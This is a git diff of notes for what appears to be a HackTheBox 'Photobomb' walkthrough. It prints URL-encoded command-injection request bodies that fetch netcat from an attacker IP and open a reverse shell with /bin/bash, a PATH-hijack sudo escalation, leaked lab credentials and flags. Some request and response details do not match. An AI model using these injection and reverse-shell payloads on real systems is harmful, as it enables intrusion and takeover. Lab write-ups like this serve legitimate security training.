@@ -1,1 +1,68 @@
+# get Shell
 1. surfing reirects to http://photobomb.htb/. added to hosts file
+<<<<<<< HEAD
+=======
+2. everything with "/print*" asks for basic auth. other is special 404 error:
+	Sinatra doesn’t know this ditty.
+		Try this:
+
+		get '/bla' do
+		  "Hello World"
+		end
+
+3. the Image in the 404 error is located at: "http://127.0.0.1:4567/__sinatra__/404.png". maybe ssrf will help me later
+4. in the photobomb.js file there were creds (god damit...)
+	pH0t0:b0Mb!
+
+5. The POST request to printer with "photo=.&filetype=jpg&dimensions=1000x1500" returned error "Failed to generate a copy of ."
+6. The POST request to printer with no data returned detailed error in server.rb file
+
+
+7. I see in the response the name given to the file...
+	"Content-Disposition: attachment; filename=kevin-charit-XZoaTJTnB9U-unsplash_1000x1500.jpg"
+	Lets try command injection (maybe the resize is by command line)...
+		request:
+			photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg;sleep 10&dimensions=1000x1500
+		response:
+			sleeps for 10 seconds and then... 
+			Content-Disposition: attachment; filename=kevin-charit-XZoaTJTnB9U-unsplash_1000x1500.jpg;sleep 10
+			Failed to generate a copy of kevin-charit-XZoaTJTnB9U-unsplash.jpg
+			IT WORKED!!
+
+8. now to get a shell:
+	a. download nc
+		req
+			photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg%3bwget%20http%3a%2f%2f10.10.14.80%3a8000%2fnc%20-O%20nc&dimensions=1000x1500
+		res
+			filename=kevin-charit-XZoaTJTnB9U-unsplash_1000x1500.jpg;wget http://10.10.14.80:8000/nc -O nc
+	b. chmod
+		req
+			photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg%3bchmod%20%2bx%20abdoabdiosbaoda&dimensions=1000x1500
+		res
+			filename=kevin-charit-XZoaTJTnB9U-unsplash_1000x1500.jpg;chmod +x nc
+	c. get shell!
+		req
+			photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg%3b.%2fabdoabdiosbaoda%2010.10.14.80%204242%20-e%20%2fbin%2fbash&dimensions=1000x1500
+		res
+			hang....
+
+# PE
+1. sudo -l shows:
+	Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+	User wizard may run the following commands on photobomb:
+    	(root) SETENV: NOPASSWD: /opt/cleanup.sh
+
+    The script cleanup.sh does this:
+    	find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+
+    so all we need to do is add /tmp to the $PATH and copy bash to /tmp/file as follows:
+    	a. cp /bin/bash /tmp
+    	b. sudo PATH=/tmp:$PATH /opt/cleanup.sh
+    	c. WIN
+
+
+userflag:2b5337cdf16dc092519c292e36df72d5
+rootflag:70a97e4510d099d46a4216f99ec98d6d
+>>>>>>> 6c69cc8 (finished Photobomb)
